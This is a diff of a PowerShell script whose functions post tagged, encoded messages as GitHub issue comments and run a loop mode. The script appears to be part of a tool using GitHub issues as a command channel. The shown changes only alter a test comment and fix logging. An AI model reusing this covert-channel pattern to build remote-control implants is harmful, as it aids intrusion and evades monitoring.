@@ -36,7 +36,7 @@ function Send-Message
             Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
             $mergedBody = "[" + $commandID + "]:" + $encodedBody
             Write-Console -Message ("Merged body is " + $mergedBody)
-            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]"Hello world! Testing 123")
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]"Hello world! Testing 123adjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdj")
         }           
     }
     catch
@@ -66,10 +66,7 @@ function Write-Console
             Write-Host ("DEBUG: " + $message)
         }
 
-        #$consoleLog = $consoleLog + $timeStamp +  ": " + $message + "`n"
-        Write-Host $timeStamp
-        Write-Host $message
-        $consoleLog = $consoleLog + $timeStamp +  ": " + $message
+        $consoleLog = $consoleLog + $timeStamp +  ": " + $message + "`n"
 	}
 	catch
 	{
@@ -600,6 +597,7 @@ function Start-LoopMode
 #ENTRY POINT
 
 $debugMode = $True
+$consoleLog = ""
 Write-Console -Message ("Program starting with debug mode set to " + $debugMode + ".")
 
 #Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
@@ -618,6 +616,7 @@ ForEach($proc in $procInfo)
             Remove-Variable -Name procInfo -Force
             Remove-Variable -Name proc -Force
             Remove-Variable -Name numPowerShellProcs -Force
+            Remove-Variable -Name consoleLog -Force
             Exit
         }
     }
@@ -625,8 +624,6 @@ ForEach($proc in $procInfo)
 Write-Console -Message ("Done. This is the only instance of PowerShell. Execution continuing.")
 
 #Declare global variables
-$consoleLog = ""
-
 $GitHubUserName = ""
 $expectedGitHubUserName = "BeinnUais1"
 $repositoryName = "ceannard1"
